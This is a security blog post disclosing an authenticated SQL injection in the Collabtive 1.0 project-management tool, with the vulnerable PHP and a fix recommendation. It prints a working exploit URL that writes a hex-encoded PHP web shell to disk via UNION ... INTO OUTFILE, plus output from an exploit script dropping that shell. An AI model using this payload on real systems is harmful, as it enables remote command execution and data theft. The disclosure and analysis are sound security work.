---
categories:
- sqli
- vulnerability
- collabtive
comments: false
date: "2013-06-21T22:40:53Z"
title: Collabtive 1.0 - SQLi
---

[Collabtive](http://collabtive.o-dyn.de/) is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found [here](http://sourceforge.net/projects/collabtive/?source=directory), which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github [repository](https://github.com/philippK-de/Collabtive).

User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:

```
 if (!empty($start) and !empty($end)) {
        $track = $tracker->getUserTrack($id, $fproject, $taski, $start, $end);
    } elseif (is_array($fproject)) {
        foreach ($fproject as $fpro) {
            $ptrack = $tracker->getUserTrack($id, $fpro, $taski, $start, $end);
            if (!empty($ptrack)) {
                foreach ($ptrack as $mytrack) {
                    array_push($track, $mytrack);
                }
            }
        }
    } 
```

Of interest is the `getUserTrack` function, as follows:

```
function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)
    {
        global $conn;
        $user = (int) $user;
        $project = (int) $project;
        $lim = (int) $lim;

        if ($project > 0) {
            $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
            $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
            $order = " ORDER BY ended ASC";
        } else {
            $sql = "SELECT * FROM timetracker WHERE user = $user";
            $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
            $order = " ORDER BY ended ASC";
        }

        if ($task > 0) {
            $sql .= " AND task = $task";
            $num .= " AND task = $task";
        }

        if ($start > 0 and $end > 0) {
            $start = strtotime($start);
            $end = strtotime($end . " +1 day");
            $end = $end - 1;
            $sql .= " AND ended >=$start AND ended<=$end ";
            $num .= " AND ended >=$start AND ended<=$end ";
        }

        if ($num) {
            $num = $conn->query($num)->fetch();
            $num = $num[0];
        } else {
            $num = 0;
        }
```

The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn't do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, `task=1 UNION SELECT passwords FROM user`.  Thus we highlight the importance of parameterized queries.  Just use them.

This can be exploited with a simple UNION query to drop a shell:

```
http://192.168.1.219/collabtive/manageuser.php?action=profile&id=1&task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&project=1
```

Exploiting:

```
root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
[!] Dropping web shell on 192.168.1.83...
[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls
```

{{< figure class="center" src="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg" >}}

[Exploit](http://www.exploit-db.com/exploits/26410/)
